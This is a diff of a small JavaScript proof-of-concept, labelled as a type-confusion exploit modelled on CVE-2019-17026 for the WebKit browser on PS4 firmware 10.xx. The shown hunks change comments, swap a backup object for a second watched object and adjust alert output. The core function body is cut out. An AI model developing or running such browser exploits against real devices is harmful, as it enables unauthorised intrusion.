@@ -1,11 +1,11 @@
-// Clarified POC for CVE-2019-17026-like in WebKit on PS4 10.xx
+// Extended POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
 const NUM_ITERATIONS = 10;
 const ARRAY_LENGTH = 100;
 
 let OBJ = { a: 41 };
 OBJ.a = 42;
-let TARGET = { secret: 0x12345678, extra: 0x87654321 }; // Distinct values
-let ORIGINAL_TARGET = { secret: TARGET.secret, extra: TARGET.extra }; // Backup
+let TARGET = { secret: 0x12345678, extra: 0x87654321 };
+let OTHER = { value: 0xdeadbeef }; // كائن إضافي لمراقبته
 
 function f(obj, idx, targetAddr) {
     let v = OBJ.a;
@@ -44,10 +44,10 @@ function main() {
         let r = f(obj, idx, isLastIteration ? TARGET : null);
         alert('Iteration ' + i + ': Result = ' + r);
     }
-    alert('Original TARGET.secret = ' + ORIGINAL_TARGET.secret);
-    alert('Current TARGET.secret = ' + TARGET.secret);
-    alert('Original TARGET.extra = ' + ORIGINAL_TARGET.extra);
-    alert('Current TARGET.extra = ' + TARGET.extra);
+    alert('Final OBJ.a = ' + OBJ.a);
+    alert('TARGET.secret = ' + TARGET.secret);
+    alert('TARGET.extra = ' + TARGET.extra);
+    alert('OTHER.value = ' + OTHER.value); // تحقق من كائن آخر
 }
 
 main();
